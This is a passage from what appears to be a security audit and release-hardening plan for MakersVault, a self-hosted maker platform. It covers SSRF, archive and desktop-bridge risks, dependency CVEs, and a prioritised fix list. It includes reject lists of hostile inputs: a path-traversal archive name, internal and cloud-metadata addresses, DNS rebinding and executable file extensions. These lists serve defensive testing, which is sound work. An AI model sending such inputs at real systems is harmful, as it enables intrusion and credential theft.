..\windows-path
10,001 entries
extreme compression ratio
expanded size over limit
duplicate names
nested archive
```

## SSRF

Reject:

```text
127.0.0.1
::1
169.254.169.254
10.0.0.1
172.16.0.1
192.168.0.1
localhost
example.local
public -> private redirect
DNS safe -> private rebind
IPv4-mapped IPv6 internal addresses
```

## Bridge

Reject:

```text
arbitrary external host
.exe
.bat
.cmd
.ps1
.lnk
.url
oversized download
expired ticket
ticket for different asset
replayed ticket
```

---

# 16. v5.1 Security Release Gate

Before v5.1 is called production-ready, complete the following.

## P0 — Release Blockers

- [ ] Remove default admin password behavior.
- [ ] Remove default JWT signing secret behavior.
- [ ] Implement first-run administrator setup or secure bootstrap.
- [ ] Upgrade `python-multipart`.
- [ ] Upgrade Pillow.
- [ ] Add application/proxy upload-size enforcement.
- [ ] Add aggregate ZIP expansion limits.
- [ ] Harden the desktop bridge against arbitrary URLs/files.
- [ ] Validate every remote-import redirect before connecting.
- [ ] Prevent DNS-rebinding/TOCTOU SSRF.
- [ ] Design RBAC before enabling multiple users.
- [ ] Replace Vite dev server with a production static build for release images.

## P1 — Strongly Recommended for v5.1

- [ ] Stop using primary JWTs in query parameters.
- [ ] Move away from long-lived JWTs in `localStorage`.
- [ ] Add login throttling.
- [ ] Add session revocation.
- [ ] Add audit logging.
- [ ] Reject/contain mount-import symlinks.
- [ ] Sanitize ZIP output paths.
- [ ] Add CSP and security headers.
- [ ] Add trusted-host policy.
- [ ] Add security CI.
- [ ] Add SECURITY.md and responsible-disclosure instructions.

## P2 — Post-v5.1 Hardening

- [ ] WebAuthn/passkeys.
- [ ] Dedicated isolated import worker.
- [ ] Signed release binaries.
- [ ] SBOM publication.
- [ ] Container image signing.
- [ ] Reproducible builds.
- [ ] Encrypted cloud backup design.
- [ ] Tenant-isolation test suite.
- [ ] Third-party penetration test before hosted multi-tenant launch.

---

# 17. Suggested Security Architecture

A future hardened deployment could look like:

```text
                    Internet
                       │
                       ▼
              Reverse Proxy / TLS
              ├── request limits
              ├── security headers
              ├── host allowlist
              └── rate limiting
                       │
          ┌────────────┴────────────┐
          ▼                         ▼
   Static Web UI                 FastAPI
                               non-root
                                  │
                     ┌────────────┼────────────┐
                     ▼            ▼            ▼
                  Database      Storage     Job Queue
                                                │
                                                ▼
                                      Isolated Import Worker
                                                │
                                                ▼
                                         Public Internet
```

Desktop bridge:

```text
Browser
   │
   ▼
short-lived asset ticket
   │
   ▼
MakersVault Bridge
   │
   ├── validates configured server
   ├── validates ticket
   ├── validates extension
   ├── validates size
   └── launches explicit configured tool
```

---

# 18. Security Documentation Recommended for the Repository

Add:

```text
SECURITY.md
docs/
├── security/
│   ├── THREAT_MODEL.md
│   ├── AUTHENTICATION.md
│   ├── FILE_SECURITY.md
│   ├── IMPORT_SECURITY.md
│   └── BRIDGE_SECURITY.md
```

## SECURITY.md

Should explain:

- Supported versions.
- How to privately report a vulnerability.
- Expected response process.
- Request not to disclose unpatched vulnerabilities publicly.
- Security contact.

Because MakersVault is open source, establishing a responsible disclosure path before the user base grows is valuable.

---

# 19. Recommended Security Philosophy

MakersVault's security philosophy can align directly with its open-source philosophy.

> **Users should not have to trust MakersVault blindly. They should be able to verify how their files, credentials, and systems are protected.**

Security features should remain part of the open-source core.

Do not paywall:

- MFA.
- Secure authentication.
- Backups.
- Encryption support.
- Security patches.
- Auditability required for safe operation.

Paid services can provide:

- Managed hosting.
- Managed backups.
- Monitoring.
- Off-site storage.
- Managed upgrades.
- Professional support.

The secure behavior of MakersVault itself should remain available to everyone.

---

# 20. Final Assessment

MakersVault does **not** need a complete security rewrite.

Several strong controls already show security awareness, particularly:

- filename normalization,
- ZIP path validation,
- SSRF address filtering,
- mount-path containment,
- ORM usage,
- React escaping,
- and non-root containers.

The main weaknesses come from a handful of boundaries that grew naturally as features were added:

```text
browser -> desktop bridge
API -> remote Internet
user -> archive/image parser
single-user auth -> planned multi-user auth
development deployment -> production deployment
```

Those are exactly the boundaries worth hardening for v5.1.

If the P0 items are addressed, v5.1 can make a meaningful security claim:

> **MakersVault is designed to safely handle untrusted maker files and self-hosted deployments, rather than treating security as an afterthought.**

That would be a meaningful competitive advantage for a self-hosted maker platform.

---

# Appendix A — Relevant Dependency Advisories Reviewed

## python-multipart

Current repository pin:

```text
0.0.9
```

Relevant reviewed advisories:

```text
CVE-2024-53981
GHSA-59g5-xgcq-4qw3

CVE-2026-40347
GHSA-mj87-hwqh-73pj

CVE-2026-42561
GHSA-pp6c-gr5w-3c5g

CVE-2026-53540
GHSA-v9pg-7xvm-68hf
```

The final advisory has limited applicability to FastAPI's normal parser path, but upgrading to the current fixed release line is still appropriate.

---

## Pillow

Current repository pin:

```text
10.4.0
```

Relevant reviewed advisory:

```text
CVE-2026-25990
GHSA-cfh3-3jmp-rvhc
```

Affected:

```text
>= 10.3.0 and < 12.1.1
```

MakersVault's thumbnail path uses `Image.open()` on user-controlled files, making image parser security directly relevant.

---

## Vite

Current lockfile:

```text
5.4.20
```

A reviewed advisory affecting this release on Windows includes:

```text
CVE-2025-62522
GHSA-93m4-6634-74q7
```

More importantly, MakersVault currently uses the Vite **development server** as the deployed web server. Production releases should use built static assets served by a dedicated production server.

---

## Starlette

Current repository pin:

```text
0.38.5
```

Modern Starlette releases contain security fixes not present in this version.

Not every published Starlette advisory applies directly to MakersVault's current code paths, but the framework should be updated as part of the dependency refresh and verified with `pip-audit`.

---

# Appendix B — OWASP / CWE Mapping

| Finding | OWASP Category | CWE |
|---|---|---|
| Default credentials | A07 Identification & Authentication Failures | CWE-1392 / CWE-798 |
| SSRF | A10 Server-Side Request Forgery | CWE-918 |
| Vulnerable dependencies | A06 Vulnerable and Outdated Components | — |
| Unlimited upload / ZIP bomb | A04 Insecure Design | CWE-400 / CWE-409 |
| JWT in URL | A02 Cryptographic/Secret Handling concern | CWE-598 |
| Login brute force | A07 Identification & Authentication Failures | CWE-307 |
| Symlink import | A01 Broken Access Control / file boundary | CWE-59 |
| Missing RBAC | A01 Broken Access Control | CWE-862 |
| ZIP output traversal | A01 / file path handling | CWE-22 |
| Bridge arbitrary download/open | A04 Insecure Design / software integrity | CWE-494 |
| Missing host/security policy | A05 Security Misconfiguration | — |

---

# Appendix C — Immediate v5.1 Security Sprint

If security work is constrained to one focused sprint, implement in this order:

```text
1. Upgrade python-multipart + Pillow
2. Remove default credentials/secrets
3. Add upload/archive resource limits
4. Lock down bridge URL/file handling
5. Fix redirect-safe SSRF implementation
6. Replace Vite dev server in release image
7. Implement CurrentUser + RBAC foundation
8. Replace query-string JWT asset access
9. Add login throttling/session revocation
10. Add CI security scanning + SECURITY.md
```

This sequence removes the largest exploitable risks first while also creating the authentication foundation needed for multi-user v5.1.
